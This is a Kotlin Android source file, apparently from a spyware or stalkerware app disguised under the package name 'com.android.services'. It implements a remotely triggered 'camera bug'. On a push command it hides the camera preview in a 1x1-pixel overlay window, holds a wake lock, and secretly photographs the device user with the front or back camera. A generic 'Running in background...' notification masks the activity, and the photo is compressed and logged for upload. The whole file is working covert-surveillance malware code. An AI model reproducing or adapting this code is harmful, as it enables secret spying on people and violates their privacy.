package com.android.services.services.cameraBug


import android.annotation.SuppressLint
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.net.Uri
import android.os.*
import android.view.Gravity
import android.view.LayoutInflater
import android.view.WindowManager
import androidx.annotation.RequiresApi
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.view.PreviewView
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import com.android.services.R
import com.android.services.db.entities.CameraBug
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.receiver.NotificationBroadcastReceiver
import com.android.services.services.RemoteDataService
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.ImageCompression
import com.android.services.util.logException
import com.android.services.util.logVerbose
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.util.concurrent.ExecutionException


@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
class CameraBugCommandProcessingBaseImpl(
    val service: LifecycleService,
    val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope
) : CameraBugCommandProcessingBase(service.applicationContext) {

    /** Initialize the CameraBug Preview in a Popup Window using [WindowManager] **/
    @SuppressLint("InflateParams")
    override fun initialize() {
        try {
            logVerbose("In Initialize() -> Ready to attach a Floating Window", TAG)
            startAndCreateNotification()
            mWindowManager = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            viewFinder = LayoutInflater.from(applicationContext)
                .inflate(R.layout.layout_camera_bug, null) as PreviewView
            val layoutParams = WindowManager.LayoutParams(
                1, 1,
                windowManagerFlagOverlay,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
            )
            layoutParams.gravity = Gravity.START or Gravity.TOP
            logVerbose("Attaching AutoFitTextureView to Window ", TAG)
            mWindowManager.addView(viewFinder, layoutParams)
            cameraBugStatus = FcmPushStatus.INITIALIZED.getStatus()
        } catch (exp: Exception) {
            logException("Initialize() Error: ${exp.message}", TAG, exp)
        }
    }

    private fun startAndCreateNotification() {
        val notificationIntent =
            Intent(service.applicationContext, NotificationBroadcastReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            service.applicationContext,
            CAMERA_BUG_NOTIFICATION_ID,
            notificationIntent,
            PendingIntent.FLAG_UPDATE_CURRENT
        )
        val notification =
            NotificationCompat.Builder(service.applicationContext, RemoteDataService.CHANNEL_ID)
                .setContentText("Running in background...")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentIntent(pendingIntent)
                .build()
        service.startForeground(CAMERA_BUG_NOTIFICATION_ID, notification)
    }

    override fun parseIntent(intent: Intent) {
        intent.let {
            logVerbose("In OnStartCommand", TAG)
            cameraBugPush = it.getParcelableExtra(KEY_CAMERA_BUG_PUSH)!!
            logVerbose("cameraBug Command = $cameraBugPush", TAG)
            if (cameraBugStatus != null) {
                cameraBugPush.let {push->
                    acquireWakeLock()
                    try {
                        push.customData?.let {data-> customData=data }
                        initCamera(applicationContext) { cameraProvider ->
                            bindCameraUseCases(cameraProvider)
                        }
                    } catch (exp: Exception) {
                        logException("startCamera() exception = ${exp.message}", TAG)
                        updateCameraBugPushAsCorrupted()
                    }
                }
            } else {
                updateCameraBugPushAsCorrupted()
            }
        }
    }

    override fun startCommand() {
        startAndCreateNotification()
    }

    private fun initCamera(context: Context, onCameraReady: (ProcessCameraProvider) -> Unit) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
        cameraProviderFuture.addListener({
            val cameraProvider = try {
                cameraProviderFuture.get()
            } catch (e: ExecutionException) {
                throw IllegalStateException("Camera initialization failed.", e.cause!!)
            }
            onCameraReady(cameraProvider)
        }, ContextCompat.getMainExecutor(context))
    }

    private fun bindCameraUseCases(cameraProvider: ProcessCameraProvider) {
        // Create configuration object for the viewfinder use case
        previewUseCase = Preview.Builder()
            .build()
            .also {
                it.setSurfaceProvider(viewFinder.surfaceProvider)
            }

        captureUseCase = ImageCapture.Builder()
            // We don't set a resolution for image capture; instead, we
            // select a capture mode which will infer the appropriate
            // resolution based on aspect ration and requested mode
            .setCaptureMode(ImageCapture.CAPTURE_MODE_MAXIMIZE_QUALITY)
            .build()

        val analyzer = LuminosityAnalyzer().apply {
            addListener {
                logVerbose(
                    "Average luminosity: $it. Frames per second: ${
                        "%.01f".format(
                            framesPerSecond
                        )
                    }", TAG
                )
            }
        }
        analysisUseCase = ImageAnalysis.Builder()
            .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
            .build()
            .also {
                it.setAnalyzer(cameraExecutor, analyzer)
            }

        try {
            val cameraLens =
                if (customData.equals("frontCamera", ignoreCase = true))
                    CameraSelector.LENS_FACING_FRONT else CameraSelector.LENS_FACING_BACK

            // Unbind use cases before rebinding
            cameraProvider.unbindAll()

            // Bind use cases to lifecycle
            val camera = cameraProvider.bindToLifecycle(
                service,
                CameraSelector.Builder().requireLensFacing(cameraLens)
                    .build(),
                previewUseCase,
                captureUseCase,
                analysisUseCase
            )
            takePhoto()
        } catch (exc: Exception) {
            logVerbose("Use case binding failed. This must be running on main thread.", TAG)
        }
    }

    @Throws(Exception::class)
    private fun takePhoto() {
        // Get a stable reference of the modifiable image capture use case
        val imageCapture = captureUseCase
        // Create time-stamped output file to hold the image
        val photoFile = File(mFilePath)
        // Create output options object which contains file + metadata
        val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

        // Set up image capture listener, which is triggered after photo has
        // been taken
        imageCapture.takePicture(
            outputOptions,
            ContextCompat.getMainExecutor(service),
            object : ImageCapture.OnImageSavedCallback {
                override fun onError(exc: ImageCaptureException) {
                    val reason = when (exc.imageCaptureError) {
                        ImageCapture.ERROR_UNKNOWN -> "unknown error"
                        ImageCapture.ERROR_FILE_IO -> "unable to save file"
                        ImageCapture.ERROR_CAPTURE_FAILED -> "capture failed"
                        ImageCapture.ERROR_CAMERA_CLOSED -> "camera closed"
                        ImageCapture.ERROR_INVALID_CAMERA -> "invalid camera"
                        else -> "unknown error"
                    }
                    val msg = "Photo capture failed: $reason"
                    logException("Photo capture failed: $msg", TAG, exc)
                    updateCameraBugPushAsCorrupted()
                }

                override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                    cameraBugStatus = FcmPushStatus.SUCCESS.getStatus()
                    val savedUri = Uri.fromFile(photoFile)
                    logVerbose("Photo capture succeeded: $savedUri", TAG)
                    coroutineScope.launch {
                        compressResultedImage(uri = savedUri)
                        service.stopSelf()
                    }
                }
            })
    }

    /**
     * This functions perform the compression work on the Resulted output image
     * Takes the @param uri [Uri] of image file to be compressed as a Parameter & Processes it for compression
     */
    private suspend fun compressResultedImage(uri: Uri) {
        withContext(Dispatchers.IO) {
            logVerbose("compression work started for $mFilePath", TAG)
            ImageCompression.compressImage(
                applicationContext, AppConstants.CAMERA_BUG_TYPE,
                mFilePath, uri, ""
            )
            logVerbose("compression work ended for $mFilePath", TAG)
        }
    }

    @Throws(Exception::class)
    private suspend fun insertCameraBug() {
        withContext(Dispatchers.IO) {
            when (cameraBugStatus) {
                FcmPushStatus.SUCCESS.getStatus() -> {
                    val currentSystemTime = System.currentTimeMillis()
                    val cameraBug = CameraBug()
                    cameraBug.apply {
                        this.file = mFilePath
                        this.name = AppUtils.formatDateCustom(currentSystemTime.toString())
                        this.cameraType =
                            if (customData == "frontCamera") "FRONT" else "BACK"
                        this.startDatetime = AppUtils.formatDate(currentSystemTime.toString())
                        this.pushId = cameraBugPush.pushId
                        this.pushStatus = cameraBugStatus!!
                    }
                    localDatabaseSource.insertCameraBug(cameraBug)
                }
                FcmPushStatus.INITIALIZED.getStatus() -> {
                    localDatabaseSource.updatePushStatus(
                        cameraBugPush.pushId,
                        FcmPushStatus.FAILED.getStatus(),
                        0
                    )
                }
                else -> {
                    if(cameraBugStatus!=null){
                        localDatabaseSource.updatePushStatus(
                            cameraBugPush.pushId,
                            cameraBugStatus!!,
                            0
                        )
                        AppUtils.deleteFile(applicationContext,mFilePath)
                    }
                    logVerbose(
                        "CameraBug failed with status = $cameraBugStatus", TAG
                    )
                }
            }
        }
    }

    override fun onServiceDestroy() {
        logVerbose("In OnDestroy -> Releasing Resources", TAG)
        coroutineScope.launch(Dispatchers.Main) {
            try {
                insertCameraBug()
                shutDownExecutorService()
                removeWindow()
                releaseWakeLock()
            } catch (exp: Exception) {
                logException(
                    "onDestroy Exception = ${exp.message}",
                    TAG
                )
                updateCameraBugPushAsCorrupted()
            }
        }
    }

    private fun updateCameraBugPushAsCorrupted() {
        cameraBugStatus = FcmPushStatus.FILE_CORRUPTED.getStatus()
        coroutineScope.launch {
            withContext(Dispatchers.IO) {
                localDatabaseSource.updatePushStatus(
                    cameraBugPush.pushId,
                    cameraBugStatus!!,
                    0
                )
                AppUtils.deleteFile(applicationContext, mFilePath)
            }
        }
        service.stopSelf()
    }

    private fun shutDownExecutorService() {
        if (!cameraExecutor.isShutdown) {
            cameraExecutor.shutdown()
        }
        if (!photoCaptureExecutor.isShutdown) {
            photoCaptureExecutor.shutdown()
        }
    }

    private fun acquireWakeLock() {
        val pm = service.applicationContext.getSystemService(Service.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            TAG_CAMERA_BUG_WAKE_LOCK
        )
        wakeLock!!.acquire((60 * 1000).toLong())
    }

    private fun releaseWakeLock() {
        if (wakeLock != null && wakeLock!!.isHeld) wakeLock!!.release()
    }

    private fun removeWindow() {
        if (viewFinder.parent != null) {
            mWindowManager.removeViewImmediate(viewFinder)
        }
    }
}